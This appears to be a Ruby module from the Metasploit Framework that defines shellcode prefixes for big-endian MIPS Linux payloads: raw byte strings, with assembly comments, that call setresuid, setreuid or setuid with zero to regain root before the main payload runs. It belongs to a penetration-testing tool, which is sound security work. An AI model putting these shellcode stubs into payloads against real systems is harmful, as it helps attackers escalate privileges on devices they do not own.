#
# Linux mipsbe prepends
#
module Msf::Payload::Linux::Mipsbe::Prepends
  include Msf::Payload::Linux::Prepends

  def prepends_order
    %w[PrependSetresuid PrependSetreuid PrependSetuid]
  end

  def appends_order
    %w[]
  end

  def prepends_map
    {
      # setresuid(0, 0, 0)
      'PrependSetresuid' => "\x28\x04\xff\xff" + #    slti  a0, zero, -1  (a0 = 0)     #
        "\x28\x05\xff\xff" + #    slti  a1, zero, -1  (a1 = 0)     #
        "\x28\x06\xff\xff" + #    slti  a2, zero, -1  (a2 = 0)     #
        "\x24\x02\x10\x59" + #    li    v0, 4185      (__NR_setresuid) #
        "\x01\x01\x01\x0c", #    syscall 0x40404                  #

      # setreuid(0, 0)
      'PrependSetreuid' => "\x28\x04\xff\xff" + #    slti  a0, zero, -1  (a0 = 0)     #
        "\x28\x05\xff\xff" + #    slti  a1, zero, -1  (a1 = 0)     #
        "\x24\x02\x0f\xe6" + #    li    v0, 4070      (__NR_setreuid) #
        "\x01\x01\x01\x0c", #    syscall 0x40404                  #

      # setuid(0)
      'PrependSetuid' => "\x28\x04\xff\xff" + #    slti  a0, zero, -1  (a0 = 0)     #
        "\x24\x02\x0f\xb7" + #    li    v0, 4023      (__NR_setuid) #
        "\x01\x01\x01\x0c", #    syscall 0x40404                  #
    }
  end

  def appends_map
    {}
  end
end
